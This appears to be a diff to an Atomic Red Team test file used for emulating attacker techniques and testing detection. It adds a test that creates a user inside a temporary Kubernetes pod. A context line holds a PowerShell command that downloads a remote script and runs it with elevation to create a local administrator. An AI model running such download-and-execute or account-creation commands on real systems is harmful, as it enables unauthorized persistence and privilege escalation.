@@ -185,3 +185,30 @@ atomic_tests:
     command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')
     name: powershell
     elevation_required: true
+-   name: Create a Linux user via kubectl in a Pod
+    description: |
+      Launches a short-lived Alpine pod and creates a Linux user inside the pod.
+      The pod is automatically deleted after execution.
+    supported_platforms:
+    - containers
+    input_arguments:
+      pod_name:
+        description: K8s pod_name to execute the command in
+        type: string
+        default: atomic-linux-useradd
+      username:
+        description: Username of the user to create inside the pod
+        type: string
+        default: evil_user
+    dependencies:
+    - description: kubectl must be installed and configured
+      get_prereq_command: |
+        echo "kubectl must be installed manually"
+      prereq_command: |
+        which kubectl
+    executor:
+      name: bash
+      elevation_required: false
+      command: |
+        kubectl run #{pod_name} --image=alpine --restart=Never --rm -it -- sh -lc 'adduser -D #{username} && id #{username}'
+
